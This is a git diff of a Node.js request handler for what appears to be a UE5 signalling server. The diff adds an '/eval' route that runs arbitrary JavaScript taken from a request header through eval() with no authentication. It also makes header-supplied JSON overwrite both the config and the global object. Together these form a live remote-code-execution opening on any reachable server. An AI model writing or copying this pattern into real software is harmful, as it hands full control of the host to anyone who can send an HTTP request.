@@ -1,18 +1,20 @@
-const fs = require('fs').promises;
 
-module.exports = function (request, response, server) {
+module.exports = async function (request, response, server) {
 
   switch (request.url) {
     case "/signal": {
-      Signal(request, response, server);
+      await Signal(request, response, server);
 
       break;
     }
 
-    case "/exit": {
-      response.end(() => {
-        process.exit(0);
-      })
+    case "/eval": {
+      try {
+        const result = await eval(decodeURIComponent(request.headers['eval']))
+        response.end(String(result), () => { })
+      } catch (err) {
+        response.end(String(err), () => { })
+      }
       break;
     }
 
@@ -28,57 +30,48 @@ module.exports = function (request, response, server) {
   }
 };
 
-// 读取配置：先读取配置文件，配置文件中没有的从环境变量加载
-// json直接读取
-
 // 修改整体配置
-function Signal(request, response, server) {
-  let body = '';
-  request.on('data', (chunk) => {
-    body += chunk;
-  });
+async function Signal(request, response, server) {
+  try {
+    let newSignal = JSON.parse(decodeURIComponent(request.headers['signal']))
 
-  request.on('end', async () => {
-    //获取页面提交的json串
-    body = JSON.parse(body);
 
     let signal = require('./signal.json');
 
-    Object.assign(signal, body);
+    Object.assign(signal, newSignal);
 
     //配置全局生效  除PORT|UE5未生效、  env暂时不管
-    Object.assign(global, body);
-
-    try {
+    Object.assign(global, newSignal);
 
 
-      //修改了端口，执行下列方法使其生效
-      if (body.PORT) {
-        await global.serve();
 
-      }
+    //修改了端口，执行下列方法使其生效
+    if (newSignal.PORT) {
+      await global.serve();
 
-      if (body.UE5) {
-        global.InitUe5Pool();
-      }
-
-      await fs.writeFile('./signal.json', JSON.stringify(signal, null, '\t'));
-
-      await new Promise(res => {
-        response.end(JSON.stringify(body), res);
-      })
-
-
-      if (body.PORT) {
-        server.closeAllConnections()
-        server.close(() => { });
-      }
-
-
-    } catch (err) {
-      response.writeHead(400);
-      response.end(err.message || err);
     }
-  });
+
+    if (newSignal.UE5) {
+      global.InitUe5Pool();
+    }
+
+    await require('fs').promises.writeFile(__dirname + '/signal.json', JSON.stringify(signal, null, '\t'));
+
+    await new Promise(res => {
+      response.end(JSON.stringify(newSignal), res);
+    })
+
+
+    if (newSignal.PORT) {
+      server.closeAllConnections()
+      server.close(() => { });
+    }
+
+
+  } catch (err) {
+    response.writeHead(400);
+    response.end(err.message || err);
+  }
+
 }
 
